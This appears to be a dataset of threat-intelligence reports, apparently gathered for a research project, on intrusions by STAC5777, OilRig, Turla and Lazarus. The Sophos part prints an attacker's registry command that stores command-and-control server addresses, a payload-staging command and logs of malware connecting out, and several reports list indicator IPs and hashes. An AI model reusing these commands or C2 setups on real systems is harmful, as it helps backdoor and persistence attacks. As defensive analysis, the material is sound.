OneDriveStandaloneUpdater executable A legitimate, signed copy of vcruntime140.dll, a Microsoft library required by OneDriveStandaloneUpdater.exe An unknown DLL, winhttp.dll A file named settingsbackup.dat SophosLabs analyzed winhttp.dll and confirmed to be malicious. It had fake version metadata from a legitimate ESET file and had been renamed so it would be side-loaded into memory by the legitimate executable due to DLL search order hijacking. The DLL was capable of collecting: System and operating system details Configuration information User credentials Keystroke the Windows API functions GetKeyboardState, GetKeyState, and get_KeySize. SophosLabs could not determine the exact nature of the file settingsbackup.dat,’ but we believe it be an encrypted payload read by the process running the side-loaded DLL and used as a 2 stage loader. nd Once the files had been placed onto the impacted host, Sophos MDR observed the threat actor opening a command prompt and making the following Windows registry change with the reg.exe utility: reg add ""HKLM\SOFTWARE\TitanPlus"" /v 1 /t REG_SZ /d ""185.190.251.16:443;207.90.238.52:443;89.185.80.86:443"" /f The registry key entries provided the IP addresses used for the command-and-control connections made by the malicious winhttp.dll code. Persistence After making other configuration changes manually via a command shell over the Quick Assist connection and the initial execution of the legitimate ‘OneDriveStandaloneUpdater.exe’ binary, the attacker then executed a PowerShell command to create a service to automatically run the exploited executable. The PowerShell command also created a .lnk file for the executable in the devices’ startup items folder to maintain persistence through reboot. Execution When executed, onedrivestandaloneupdate.exe side-loaded winhttp.dll, a loader carrying a backdoor. The loader read configuration information that had been entered by the attacker, including a file named settingsbackup.dat, and reached out to multiple IP addresses that had been added to the system’s configuration manually by the threat actor. Initial Quick Access activity Parent process Command line 6/8 C:\Windows\System32\RuntimeBroker.exe- Embedding C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe” -single-argument microsoft-edge url=https%3A%2F%2Fwww.bing.com%2Fsearch%3Fq%3DQuick%2BAssist%26filte C:\windows|system32\svchost.exe-k netsvcs-p-s Appinfo C.\Program Files|WindowsApps\MicrosoftCorporationll.QuickAssist_2.0.32.0_x64_8wekyb3d8bbwe\Microsoft C: \windows\Explorer.EXE C:\Windows\System32\cmd.exe C:\Windows\System32\cmd.exe tar xf pack.zip -C “C:\Users\<username>\AppData\Local\OneDriveUpdate C:\Windows\System32\cmd.exe C:\Users\<username>\AppData\Local\OneDriveUpdate\OneDriveStandaloneUpdater.exe -Embed Command and Control Using the unsigned OpenSSL toolkit drivers, the OneDriveStandaloneUpdate process made encrypted command-and-control connections to a set of remote hosts. The IP addresses of the hosts included a virtual private server operated by a hosting company used in the past by Russia- based threat actors. Initial execution of OneDriveStandaloneUpdater.exe connecting to C2 IP addresses Process cmd.exe Action start object C:\Users\ <username>\AppData\Local\OneDriveUpdate\OneDriveStandaloneUpdater.exe OneDriveStandaloneUpdater.exe Binary file read C:\Users\<username>\AppData\Local\OneDriveUpdate\winhttp.dll loads image into memory C:\Users\<username>\AppData\Local\OneDriveUpdate\winhttp.dll File read C:\Users\<username>\AppData \Local\OneDriveUpdate\settingsbackup.dat IP connects to 74.178.90[.]36:443 Ip connects to 195.123.241[.]24:443 Discovery Once the C2 channel was established, the Sophos MDR team observed the OneDriveStandaloneUpdater.exe process conducting scanning with the SMB protocol to map online hosts within the customers’ environment. The threat actor also scanned for Remote Desktop Protocol and Windows Remote Management (WinRM) hosts that the targeted user’s credentials could be used to connect to within the network. Lateral Movement Using the targeted user’s credentials, the threat actor made efforts to expand access beyond the initially compromised system, looking for domain access that could be elevated to move to other hosts. At one organization, they used a targeted individual’s domain credentials to connect to the organization’s VPN from outside the network and then to log into RDP hosts within the network. At another organization , they used Windows Remote Management (WinRM) to perform lateral movement. Defense Evasion In one incident, Sophos MDR observed the threat actor using the backdoor to uninstall local multifactor authentication integration on the target device. In another, the threat actor unsuccessfully attempted to uninstall the Sophos Endpoint Agent—an action blocked by Sophos’ tamper protection. Credential gathering and data exfiltration Prior to containment, Sophos MDR also observed the actor accessing files locally via notepad.exe and Word that contained the word ‘password’ in the name of the document. In one case, the threat actors used the utility mstsc.exe to access two Remote Desktop Protocol (.rdp) files to view and edit their configuration data, looking for potential credential storage. Sophos MDR also observed the threat actors accessing a network diagram for one targeted organization drawn in Visio, most likely to plan further lateral movement and impact phases of the attack. Impact In one case found in a threat hunt across all Sophos MDR customers, the threat actors attempted to execute Black Basta ransomware. This was blocked by Sophos endpoint protection. 7/8 Conclusions Sophos has deployed detections for the malware used in these campaigns including: STAC5143: ATK/RPivot-B, Python/Kryptic.IV, heuristic detection of Python malicious use of operating system libraries STAC5777: Troj/Loader-DV for STAC5777’s winhttp.dll However, organizations should take further steps to prevent attacks based on these tactics. First, unless absolutely necessary, organizations should ensure that their O365 service provisions restrict Teams calls from outside organizations or restrict that capability to trusted business partners. Additionally, remote access applications such as Quick Assist should be restricted by policy unless they are specifically used by the organization’s technical support team. Sophos can block unwanted execution of Quick Assist through application control settings in endpoint protection. Sophos strongly recommends use of Microsoft Office 365 integration with the security environment for monitoring of sources of potentially malicious inbound Teams or Outlook traffic. Organizations should also raise employee awareness of these types of tactics—these aren’t the types of things that are usually covered in anti-phishing training. Employees should be aware of who their actual technical support team is and be mindful of tactics intended to create a sense of urgency that these sorts of social-engineering driven attacks depend upon. A list of indicators of compromise for these campaigns is available on the Sophos GitHub repository. 8/8"
G0049_apt34,/Users/susan/Documents/PhD/HCI - Uncertainty/Project/TRACER/APT Reports/G0049_apt34/Iranian-OilRig-Group-Strikes-with-AutoHotkey-Keylogger-and-Malicious-Macro_TA2023065.pdf,62deda7fd2aa,G0049,"THREAT ADVISORY ATTACK REPORT Date of Publication February 7, 2023 Admiralty Code A2 TA Number TA2023065 Summary First appeared: August 2022 Threat Actor: OilRig (APT 34, Helix Kitten, Twisted Kitten, Crambus, Chrysene, Cobalt Gypsy, TA452, IRN2, ATK 40, ITG13) Attack Region: Oman, Azerbaijan, Bahrain, Iraq, Israel, Jordan, Kuwait, Lebanon, Mauritius, Qatar, Saudi Arabia, South Africa, Turkey, United Arab Emirates, Middle East, North Africa, Pakistan, Turkey, UK, USA. Attack Sector: Chemicals, Education, Energy, Financial, Government, Legal, Oil and Gas, Telecommunications, Aviation, High-Tech, Hospitality. Attack: In a recent intrusion, a threat actor utilized AutoHotkey to launch a keylogger. The Iranian Oilrig group is suspected to be the culprit behind this attack. The initial compromise was initiated with a malicious VBA macro embedded in a Word document. Attack Regions THREAT ADVISORY • ATTACK REPORT (Red) |2 Attack Details #1 #2 An attack began with the activation of a malicious macro in a Word document disguised as a job application. Upon opening the file, the victim was prompted to enable macros to complete the form, which then triggered the malware's execution. The macro generated a VBS script and two PowerShell scripts (temp.ps1 and Script.ps1) and installed a persistent presence through a scheduled task. The PowerShell script established a secure connection to the C2 server. The Iranian OilRig group initiated discovery operations using basic commands executed through PowerShell cmdlets or standard Windows tools such as whoami, net, time, tzutil, and tracert. The information gathered from LDAP discovery was saved in an XML file prior to exfiltration. Several files collected during discovery tasks, such as domain user account information and later the keylogger collected data, were exfiltrated to the C2 server via POST requests. Recommendations Security Leaders Phishing simulations and routine education and awareness training and communications rarely account for MFA fatigue and web browser hygiene. Integrate and communicate all lessons learned. Security Engineers • Uni5 Users: This is an actionable threat advisory in HivePro Uni5. Prioritize and block all indicators attributed to the threat actors and attacks through your Command Center. Test your controls with Uni5’s Breach & Attack Simulation. • All Engineers: Refer to and action upon the ’Potential MITRE ATT&CK TTPs’ & ‘Indicators of Compromise (IoC)’ on the following pages. THREAT ADVISORY • ATTACK REPORT (Red) |3 Potential MITRE ATT&CK TTPs TA0001 Initial Access TA0006 Credential Access T1059 Command and Scripting Interpreter TA0002 Execution TA0007 Discovery TA0003 Persistence TA0009 Collection TA0005 Defense Evasion TA0011 Command and Control T1059.001 PowerShell T1204 User Execution T1204.002 Malicious File T1087 Account Discovery T1087.002 Domain Account T1033 System Owner/User Discovery T1049 System Network Connections Discovery T1082 System Information Discovery T1057 Process Discovery T1053 Scheduled Task/Job T1113 Screen Capture T1056 Input Capture T1056.001 Keylogging T1573 Encrypted Channel T1560 Archive Collected Data T1560.001 Archive via Utility T1518 Software Discovery T1083 File and Directory Discovery T1566 Phishing T1124 System Time Discovery T1566.001 Spearphishing Attachment T1007 System Service Discovery T1053.005 Scheduled Task T1573.001 Symmetric Cryptography T1518.001 Security Software Discovery T1112 Modify Registry T1027 Obfuscated Files or Information Indicators of Compromise (IOCs) TYPE URLs IPV4 VALUE hxxp://45.89.125[.]189/get hxxp://45.89.125[.]189/put 45.89.125[.]189 THREAT ADVISORY • ATTACK REPORT (Red) |4 TYPE VALUE SHA256 MD5 SHA1 7ae52c0562755f909d5d79c81bb99ee2403f2c2ee4d53fd1ba7692c 8053a63f6,eb2a94ee29d902c8a13571ea472c80f05cfab8ba4ef80d 92e333372f4c7191f4,b92be3d086372fc89b3466e8d9707de78a5b 6dff3e4a2eecc92c01d55a86fd7d,e4b2411286d32e6c6d3d7abffc7 0d296c814e837ef14f096c829bf07edd45180,45f293b1b5a4aaec48 ac943696302bac9c893867f1fc282e85ed8341dd2f0f50,ac933ffc33 7d13b276e6034d26cdec836f03d90cb6ac7af6e11c045eeae8cc05, d4857156094963c8e38f6e88f4d72cb910aa537e3811eae0579f7ab c568c9ae8,be0e75d50565506baa1ce24301b702989ebe244b3a1d 248ee5ea499ba812d698,16007ea6ae7ce797451baec2132e30564 a29ee0bf8a8f05828ad2289b3690f55,bda4484bb6325dfccaa464c2 007a8f20130f0cf359a7f79e14feeab3f 691332c86dd568f87b7fff4601c37895 fc5f490dbe375779b2c6bbccdd869ca6 9a7d5f126904adc194df4dcbc2c5715c c65b10c1113c0f0d4e06609fa60d9aad f769f67681707e8f69ecdf9e62fb944c 34a2677a7776f87e810814c2d3845f47 f7611e77c5f99b81085e61b17b969afe 850b8d07180601417193a6f88227130a c3aedb781a5b96674764cd43ef076d10 a3c14604fb4454ba5722f07f89780e73 0b676ea2ad205b70b9feb1eedbfdec72137e08e5 b8c8171b6e8efd2bb0ae8d5b22749564edd38109 a86088cf31c72cc4648ee8dfa082979a74044203 2ca263fc5f1e505c1839ab0abf56571af6c7809d c5f6a48fa52a279e1f3424b97662b479716229af 79b1f6b0afe943a60560eb20677d5b801dc29ba3 475320a5bf0ba52fc9ff711d8e6dba512b3fefbf e1f4a8e434638c56b7a0d2d0317f4d0d84987a40 86da0100bb6a07a89eaa4dc3ec220e9dbd6ecf71 ed7b9ddbaee794cecb80fac794b0e6cb0ae073b5 References https://thedfirreport.com/2023/02/06/collect-exfiltrate-sleep-repeat/ https://attack.mitre.org/groups/G0049/ THREAT ADVISORY • ATTACK REPORT (Red) |5 What Next? At Hive Pro, it is our mission to detect the most likely threats to your organization and to help you prevent them from happening. Book a free demo with HivePro Uni5: Threat Exposure Management Platform. REPORT GENERATED ON February 7, 2023 • 3:33 AM © 2023 All Rights are Reserved by HivePro More at www.hivepro.com"
G0010_Turla,/Users/susan/Documents/PhD/HCI - Uncertainty/Project/TRACER/APT Reports/G0010_Turla/trendmicro.com-Examining the Activities of the Turla APT Group.pdf,14e99503bb39,G0010,"Examining the Activities of the Turla APT Group www.trendmicro.com/en_us/research/23/i/examining-the-activities-of-the-turla-group.html September 22, 2023 APT & Targeted Attacks We examine the campaigns of the cyberespionage group known as Turla over the years, with a special focus on the key MITRE techniques and the corresponding IDs associated with the threat actor group. By: Srivathsa Sharma Sep 22, 2023 Read time: ( words) In this blog entry, we examine the campaigns of the cyberespionage group known as Turla over the years, with a special focus on the key MITRE techniques and the corresponding IDs associated with the threat actor group. An introduction to Turla Regarded as a highly sophisticated advanced persistent threat (APT) group, the Russian- based Turla has been suspected to be operational since at least 2004. Turla’s group names are infamously titled after its top-class rootkits such as Snake, Venomous Bear, WhiteBear, Uroburos, Group 88, and Waterbug, all known for targeting government entities, intelligence agencies, as well as the military, educational, research, and pharmaceutical industries around the world. Like other APT groups, Turla possesses its own 1/16 specifically-designed, complex tools. However, it is the threat actor’s satellite-based command-and-control (C&C) mechanism that it uses in the latter stages of an attack, coupled with its ability to fly under the radar, that makes Turla stand out from its contemporaries. Unravelling Turla’s activities 2014 August: The “epic” Turla tale Although Turla has been known to be active in the wild for several years now, its infection vector had been a question mark. Research conducted in 2014 indicated a sophisticated multi-stage attack using Epic (a malware family used by Turla), with the campaign being dubbed as Epic Turla. The attacks, which exploited the vulnerabilities CVE-2013-5065 and CVE-2013-3346, employed spear-phishing emails that used Adobe PDF exploits and watering-hole techniques that used Java exploits (CVE-2012-1723) The major highlight of this campaign was Turla’s use of more complex backdoors like Carbon/Cobra, with the group sometimes using both backdoors as a failover. Figure 1. The MITRE ATT&CK techniques used in the August 2014 campaigns Tactics and Techniques: 2/16 TA0001 (Initial Access) T1189 (Drive-by Compromise) T1566 (Phishing) TA0002 (Execution) T1204.002 (User Execution: Malicious File) December: Turla targets Linux While the previous Turla campaigns were designed to target Windows-based machines, the campaign in August 2014 was the first instance where Turla targeted the Linux operating system. Dubbed as Penguin Turla, the group used a Linux Turla module with a C/C++ executable statically linked against multiple libraries, greatly increasing its file size for this campaign. 2016 January: The Waterbug Campaign A group of threat actors named Waterbug (alleged to be a state-sponsored group) used variants of Trojan.Turla and Trojan.Wipbot to exploit a zero-day vulnerability, specifically the Windows Kernel NDProxy.sys local privilege escalation vulnerability CVE-2013-5065. A research entry suggested that the attackers used specially crafted emails with malicious attachments and a set of compromised websites to deliver malicious payloads. 2017 March: The Carbon backdoor In 2017, ESET published a research entry on a sophisticated variant of the Turla malware, a second-stage backdoor known as Carbon. A Carbon attack initially involves the victim either receiving a spear-phishing email or visiting a compromised website, also known as a watering hole. This is then followed by the installation of a first-stage backdoor such as Tavdig or Skipper. The second-stage backdoor Carbon is then installed on key systems after renaissance activities are completed. The Carbon framework consists of a dropper to install its configuration file, a component to communicate with the C&C server, an orchestrator to handle tasks and move them laterally over the network, and a loader to execute the orchestrator. 3/16 May – The Kazuar backdoor In May 2017, a new backdoor trojan by the name Kazuar was linked to the Turla group. Written using the Microsoft .NET Framework, Kazuar contains highly functional command sets that are capable of remotely loading additional plug-ins. Kazuar gathers system and malware file name information and creates a mutex to ensure that only one instance of the malware executes on the system at a time. It then adds an LNK file to the Windows startup folder. Majority of the commands set in Kazuar share similar attributes with other backdoor Trojans. For example, the tasklist command uses a Windows Management Instrumentation (WMI) query to obtain running process from Windows while the info command is used to gather information about opened windows. Meanwhile, Kazuar’s cmd command will run commands using cmd.exe for Windows systems and /bin/bash for Unix systems. These commands strongly suggests that Kazuar was built to be a cross-platform malware targeting both Windows and Unix systems. Research conducted in early 2021 revealed several similarities between the Sunburst and Kazuar backdoors. Figure 2. The MITRE ATT&CK techniques used in the Kazuar campaigns Tactics and Techniques: TA0002 (Execution) T1047 (Windows Management Instrumentation) TA0003 (Persistence) 4/16 T1547.009 (Boot or Logon Autostart Execution: Shortcut Modification) TA0007 (Discovery) T1010 (Application Window Discovery) August: Emergence of Gazer In August, Turla unveiled a new second-stage backdoor written in C++ known as Gazer, which relied on watering-hole attacks and spear-phishing campaigns for more precise targeting of victims. Aside from being stealthier, Gazer was found to have plenty of similarities with the previously used second-stage backdoors such as Carbon and Kazuar. The defining characteristic of this campaign was the insertion of “video-game-relate” sentences throughout the code. Turla encrypts Gazer’s C&C server using its own library for 3DES and RSA. Figure 3. The MITRE ATT&CK technique used in the Gazer campaigns Tactics and Techniques: TA0011 (Command and Control) T1573 (Encrypted Channel) 2018 January: Turla adds new tools to its arsenal An intelligence report from 2018 suggested that Turla used new malicious tools known as Neuron and Nautilus in conjunction with the Snake rootkit to target Windows machines, focusing on mail and web servers in particular. Turla made use of existing Snake victims to scan for ASPX shell, with the commands being passed using encrypted HTTP cookie values. The entry also mentioned that Turla used ASPX shells to gain a foothold into the target system to deploy additional tools. 5/16 August: Turla targets Microsoft Outlook Turla targeted the foreign offices of European governments via a backdoor, with the intention of accessing highly sensitive information. The campaign targeted Microsoft Outlook and The Bat! (a popular mail client primarily used in Eastern Europe) by forwarding all outgoing emails to the attackers. The backdoor used email messages to exfiltrate data, employing specially crafted PDF documents. It also used email messages as a transport layer for its C&C server. 2019 June: Turla uses OilRig infrastructure OilRig is an Iran-linked APT group that usually targets government agencies and organizations in the Middle East. Previous research suggests that the Turla group compromised a target using OilRig’s infrastructure. The campaign saw the use of a heavily modified, custom variant of the Mimikatz tool, plus a new set of tools involving several new backdoors. In the later stages of the campaign, Turla group used a different remote procedure call (RPC) backdoor, which included code from the publicly available PowerShell Runner tool to execute PowerShell scripts (without using powershell.exe). 2020 March: New backdoors written in .NET and Python In March 2020, security researchers observed Turla targeted multiple Armenian websites using watering-hole attacks. These websites were implanted with malicious JavaScript code, although the access methods used in attack are unknown. The compromised webpage then delivered the second-stage malicious JavaScript code to fingerprint victim browser and trick them into installing a malicious flash installer. Turla then used NetFlash (a .NET downloader) and PyFlash for its second-stage malware. 6/16 Figure 4. The MITRE ATT&CK techniques used in the March 2020 campaigns Tactics and Techniques: 7/16 TA0001 (Initial Access) T1189 (Drive-by Compromise) TA0002 (Execution) T1204 (User Execution) T0003 (Persistence) T1053 (Scheduled Task/Job) T0007 (Discovery) T1016 (System Network Configuration Discovery) T1057 (Process Discovery) T1082 (System Information Discovery) TA0011 (Command and Control) T1071 (Application Layer Protocol) T1573 (Encrypted Channel) T1571 (Non-Standard Port) TA0010 (Exfiltration) T1041 (Exfiltration Over C2 Channel) May: ComRAT v4 ComRAT v4, also known as Agent.BTZ, is a remote access trojan (RAT) used by Turla and developed using C++ and employing a virtual FAT16 file system that is often used to exfiltrate sensitive documents. It is deployed using existing access methods, such as the PowerStallion PowerShell backdoor. Furthermore, it uses HTTP and emails as C&C channels. 8/16 9/16 Figure 5. The MITRE ATT&CK techniques used in ComRAT v4 attacks Tactics and Techniques: TA0002 (Execution) T1059 (Command and Scripting Interpreter) T0003 (Persistence) T1053 (Scheduled Task/Job) TA0005 (Defense Evasion) T1055 (Process Injection) T1112 (Modify Registry) T1027 (Obfuscated Files or Information) TA0007 (Discovery) T1069 (Permission Groups Discovery) T1033 (System Owner/User Discovery) T1082 (System Information Discovery) T1083 (File and Directory Discovery) T1087 (Account Discovery) T1120 (Peripheral Device Discovery) T1135 (Network Share Discovery) T1016 (System Network Configuration Discovery) TA0009 (Collection) T1213 (Data from Information Repositories) TA0011 (Command and Control) T1573 (Encrypted Channel) T1071 (Application Layer Protocol) T1102 (Web Service) TA0010 (Exfiltration) T1048 (Exfiltration Over Alternative Protocol) 10/16 December: The Crutch backdoor In December 2020, a previously undocumented backdoor and document stealer named Crutch was attributed to the Turla group. Apparently, older versions of Crutch included a backdoor that communicated with a hard-coded Dropbox account using the official HTTP API. It had the ability to execute commands related to the reading and writing of files, executing additional processes, and setting persistence via DLL hijacking on Google Chrome, Mozilla Firefox, or Microsoft OneDrive. One major feature of Crutch v4 is that it can automatically upload the files found on local and removable drives to Dropbox storage by using the Windows version of the Wget utility (unlike the previous versions that relied on the backdoor commands). 11/16 12/16 Figure 6. The MITRE ATT&CK techniques used in Crutch attacks Tactics and Techniques: 2021 September: TinyTurla The new Turla backdoor known as TinyTurla was likely used as a failover option to maintain access to the system even when the primary malware is removed. The backdoor is installed using a batch file and comes in the form of a service DLL called w64time.dll that tries to impersonate the legitimate w32time.dll file on Windows systems. 2022 May: Phishing-based reconnaissance campaign Turla’s May 2022 campaign was used for the sole purpose of reconnaissance and did not involve any use of malicious code. Security researchers discovered a document that performed requests via HTTP to its own controlled server, with the purpose of capturing the version and type of Microsoft Word application used by the victim. The information can later be used to craft a specific exploit based on the Microsoft Word version. 13/16 Figure 7. The MITRE ATT&CK techniques used in the May 2022 reconnaissance campaign Tactics and Techniques: 2023 July: Attacks using Capibar and Kazuar A July 2023 announcement from the Computer Emergency Response Team of Ukraine (CERT-UA) revealed that Turla was using the Capibar malware and Kazuar backdoor for espionage attacks on Ukrainian defensive assets. In this campaign, Capibar was used for intelligence gathering while Kazuar performed credential theft. This attack targeted diplomatic and military organizations by leveraging phishing attacks. 14/16 Figure 8. The MITRE ATT&CK techniques used in the July 2023 Capibar/Kazuar attacks Tactics and Techniques: Conclusion The Turla group is a persistent adversary with a long history of activities. Their origins, tactics, and targets all indicate a well-funded operation with highly skilled operatives. Turla has continuously developed its tools and techniques over years and will likely keep on refining them. The threat posed by groups such as Turla underscores the importance for organizations and governments to remain vigilant by staying informed, sharing intelligence, and implementing security measures that can allow both groups and individuals to better protect themselves 15/16 against these kinds of threat actors. Indicators of Compromise The indicators of compromise for the various Turla campaigns can be found here. Tags APT & Targeted Attacks | Endpoints | Network | Articles, News, Reports 16/16"
G0010_Turla,/Users/susan/Documents/PhD/HCI - Uncertainty/Project/TRACER/APT Reports/G0010_Turla/Turlas-Tiny-Backdoor-Exploits-MSBuild-to-Evade-Detection_TA2024206.pdf,dd9a92c39115,G0010,"THREAT ADVISORY ATTACK REPORT Turla’s Tiny Backdoor Exploits MSBuild to Evade Detection Date of Publication May 24, 2024 Admiralty Code A2 TA Number TA2024206 Summary Attack Began: December 4, 2023 Targeted Countries: Philippines Malware: Tiny backdoor Threat Actor: Turla (aka Waterbug, Venomous Bear, Group 88, SIG2, SIG15, SIG23 , Iron Hunter, CTG-8875, Pacifier APT, ATK 13, ITG12, Makersmark, Krypton , Belugasturgeon, Popeye, Wraith, TAG-0530, UNC4210, SUMMIT, Secret Blizzard , Pensive Ursa) Targeted Industries: NGOs Affected Platform: Windows Attack: A sophisticated campaign by the Turla APT group, is employing a Tiny backdoor. It uses malicious .LNK files disguised as legitimate documents to target individuals and leverages MSBuild to evade detection. Attack Regions Turla THREAT ADVISORY • ATTACK REPORT (Amber) |2 Attack Details #1 A sophisticated campaign likely orchestrated by the Turla APT group, employing malicious .LNK files disguised as PDF documents to deliver a stealthy Tiny backdoor. The campaign primarily targets individuals interested in human rights by using seminar invitations as lures. Upon execution, these .LNK files activate PowerShell scripts that deploy a backdoor through MSBuild, a legitimate Microsoft development tool, thereby avoiding detection. #2 The infection process involves the .LNK file executing a PowerShell script that creates and opens a lure PDF while simultaneously running an MSBuild project, which decrypts and runs a secondary payload. This payload schedules a task to repeatedly execute another MSBuild project, maintaining a persistent backdoor capable of receiving and executing commands from a command-and-control (C&C) server. The Tiny backdoor enables attackers to hide their activities, execute shell commands, upload and download files, and more. #3 Analysis links this campaign to the Turla group due to Russian- language comments in the code, the use of specific identifier values in HTTP requests, and the exploitation of compromised web servers for C&C communication. The final payload shares similarities with the TinyTurla backdoor. Recommendations Deploy Strong Email Filtering Systems: Implement robust email filtering solutions to detect and prevent the dissemination of harmful attachments, particularly those originating from suspicious or unknown sources. This can significantly reduce the likelihood of initial infection through phishing emails. Exercise Caution with Email Attachments and Links: Encourage users to exercise caution when interacting with email attachments or links, especially those from unfamiliar senders or containing unexpected content. Verify the sender's identity before opening attachments, and report suspicious emails to the IT security team. THREAT ADVISORY • ATTACK REPORT (Amber) |3 Restrict Access to Development Tools: Limit access to development tools like MSBuild and PowerShell to authorized personnel or specific systems within the organization. By restricting access, you can mitigate the risk of unauthorized usage by threat actors who may leverage these tools for malicious purposes. Monitoring and Detection: Deploy advanced threat detection and monitoring tools capable of identifying and mitigating malware attacks in real-time. This includes behavior-based analytics, intrusion detection systems, and endpoint protection solutions. Potential MITRE ATT&CK TTPs TA0002 Execution TA0010 Exfiltration TA0005 Defense Evasion T1059.001 PowerShell TA0003 Persistence T1059 Command and Scripting Interpreter TA0011 Command and Control T1204.002 Malicious File T1204 T1036 T1140 T1127 User Execution Masquerading Deobfuscate/Decode Files or Information Trusted Developer Utilities Proxy Execution T1127.001 T1053.005 T1053 T1071 MSBuild Scheduled Task Scheduled Task/Job Application Layer Protocol T1041 T1027 Exfiltration Over C2 Channel Obfuscated Files or Information THREAT ADVISORY • ATTACK REPORT (Amber) |4 Indicators of Compromise (IOCs) TYPE VALUE SHA256 b4db8e598741193ea9e04c2111d0c15ba79b2fa098efc3680a63ef457 e60dbd9, 6829ab9c4c8a9a0212740f46bf93b1cbe5d4256fb4ff66d65a3a6eb6c5 5758a1, 8c97df4ca1a5995e22c2c4887bea2945269d6f5f158def98d5ebdd531 1bb20c4, 76629afb86bd9024c3ea6759eeea197ba6c8c780e0041d1f8182d206c f3bd1b4, c2618fb013135485f9f9aa27983df3371dfdcb7beecde86d02cee0c258 d5ed7f, cac4d4364d20fa343bf681f6544b31995a57d8f69ee606c4675db60be 5ae8775 URL hxxps://ies[.]inquirer[.]com[.]ph References https://cyble.com/blog/tiny-backdoor-goes-undetected-suspected-turla- leveraging-msbuild-to-evade-detection/ https://www.hivepro.com/threat-advisory/turla-expands-their-arsenal-with-next- generation-malwares/ THREAT ADVISORY • ATTACK REPORT (Amber) |5 What Next? At Hive Pro, it is our mission to detect the most likely threats to your organization and to help you prevent them from happening. Book a free demo with HivePro Uni5: Threat Exposure Management Platform. REPORT GENERATED ON May 24, 2024 • 4:30 AM © 2024 All Rights are Reserved by Hive Pro More at www.hivepro.com"
G0032_lazarus_group,/Users/susan/Documents/PhD/HCI - Uncertainty/Project/TRACER/APT Reports/G0032_lazarus_group/Lazarus-Strikes-with-WinorDLL64-Backdoor-Discovered-in-Wslink-Malware-loader_TA2023102.pdf,31e1582449dc,G0032,"THREAT ADVISORY ATTACK REPORT Date of Publication February 24, 2023 Admiralty Code A3 TA Number TA2023102 Summary Attack began: 2021 Threat Actor: Lazarus Group Attack Region: Central Europe, North America, East Asia, and the Middle East. Attack Sector: Aerospace, Defense, Energy, Engineering, Financial, Government, Healthcare, Media, Shipping and Logistics, Technology, and BitCoin exchanges. Attack: A newly discovered backdoor named WinorDLL64 seems to be associated with the malware downloader Wslink. This revelation suggests that Lazarus, the notorious North Korea-aligned group, may have employed this tool. WinorDLL64 enables the manipulation of various files, such as exfiltration, and deletion, as well as executing further commands. Attack Regions THREAT ADVISORY • ATTACK REPORT (Red) |2 Attack Details #1 #2 In October 2021, Wslink was initially documented as a payload designed to facilitate file manipulation, code execution, and system information gathering, potentially for lateral movement. This payload has a particular interest in network sessions. The Wslink loader, which listens on a port specified in the configuration, can serve other connecting clients and even load different payloads. Recently, a new backdoor called WinorDLL64 has been found, which is linked to the Wslink malware downloader. Experts suggest the Lazarus Group, a notorious North Korea-aligned organization, is likely behind this tool. that The backdoor is a DLL that features a single unnamed export, which accepts one parameter. Messages communicated through WinorDLL64 are encrypted with 256-bit AES-CBC to ensure secure data exchange between the operator and the tool over an already-established connection. Furthermore, WinorDLL64 shares similarities in development environment, behavior, and code with various Lazarus samples found in Operation GhostSecret and the Bankshot implant. Recommendations Security Leaders Phishing simulations and routine education and awareness training and communications rarely account for MFA fatigue and web browser hygiene. Integrate and communicate all lessons learned. Security Engineers • Uni5 Users: This is an actionable threat advisory in HivePro Uni5. Prioritize and block all indicators attributed to the threat actors and attacks through your Command Center. Test your controls with Uni5’s Breach & Attack Simulation. • All Engineers: Refer to and action upon the ’Potential MITRE ATT&CK TTPs’ & ‘Indicators of Compromise (IoC)’ on the following pages. THREAT ADVISORY • ATTACK REPORT (Red) |3 Potential MITRE ATT&CK TTPs TA0042 Resource Development TA0002 Execution TA0005 Defense Evasion TA0007 Discovery TA0009 Collection TA0040 Impact T1587 Develop Capabilities T1587.001 Malware T1059 Command and Scripting Interpreter T1059.001 PowerShell T1106 Native API T1134 Access Token Manipulation T1134.002 Create Process with Token T1070 Indicator Removal T1070.004 File Deletion T1087 Account Discovery T1087.001 Local Account T1087.002 Domain Account T1057 Process Discovery T1012 Query Registry T1083 File and Directory Discovery T1082 System Information Discovery T1135 Network Share Discovery T1614 System Location Discovery T1614.001 System Language Discovery T1016 System Network Configuration Discovery T1049 System Network Connections Discovery T1033 System Owner/User Discovery T1560 Archive Collected Data T1560.002 Archive via Library T1005 Data from Local System T1531 Account Access Removal Indicators of Compromise (IOCs) TYPE MD5 SHA1 VALUE 13a44e5599c225d88d20398b4bec842a 1BA443FDE984CEE85EBD4D4FA7EB1263A6F1257F SHA-256 3bc8bbf4a1b3596e54e20609c398eab877c581ea369f6e1ef0ab0f9af e330d12 References https://www.welivesecurity.com/2023/02/23/winordll64-backdoor-vast-lazarus-arsenal/ https://thehackernews.com/2023/02/lazarus-group-using-new-winordll64.html https://attack.mitre.org/groups/G0032/ THREAT ADVISORY • ATTACK REPORT (Red) |4 What Next? At Hive Pro, it is our mission to detect the most likely threats to your organization and to help you prevent them from happening. Book a free demo with HivePro Uni5: Threat Exposure Management Platform. REPORT GENERATED ON February 24, 2023 • 2:00 AM © 2023 All Rights are Reserved by HivePro More at www.hivepro.com"
G0032_lazarus_group,/Users/susan/Documents/PhD/HCI - Uncertainty/Project/TRACER/APT Reports/G0032_lazarus_group/Dream-Job-Campaign.pdf,de964a2d59a3,G0032,"Operation ‘Dream Job’ Operation ‘Dream Job’ Widespread North Korean Espionage Campaign August 2020 TLP: White ____________________________________________________________________________________________________ www.clearskysec.com © All rights reserved to ClearSky Cyber Security ltd. 2020 TLP: White – Information is provided to the recipient only, and may not be distributed outside the initial exchange 1 | P a g e Operation ‘Dream Job’ Contents Executive Summary ......................................................................................................................................... 4 Lazarus / Hidden Cobra – a North Korean APT group ................................................................................ 5 Previous research ............................................................................................................................................ 6 Lazarus’ attack against an Israeli defense company in 2019 ................................................................ 6 Operation In(ter)ception: ESET’s research on Lazarus’ attacks published in June 2020 .................. 7 Operation North Star: McAfee’s research on Lazarus’ attacks published in July 2020 ..................... 8 Attack Vector – Job Seekers’ Recruitment Campaign ................................................................................ 9 Tools Used by the Espionage Group in the “Dream Job” Campaign ......................................................... 11 Tools and Offensive Techniques Categorized with MITRE ATT&CK ....................................................... 11 Social Engineering Attack Infrastructure ........................................................................................................ 14 Introduction ................................................................................................................................................... 14 Social Engineering methods used to Establish a Credible Attack Infrastructure ................................. 14 First Stage – Creating a Reliable Fictitious Entity ................................................................................. 14 Second Stage – Luring the victim via a Job Posting ............................................................................ 16 Third Stage – Attacker-Victim Communication 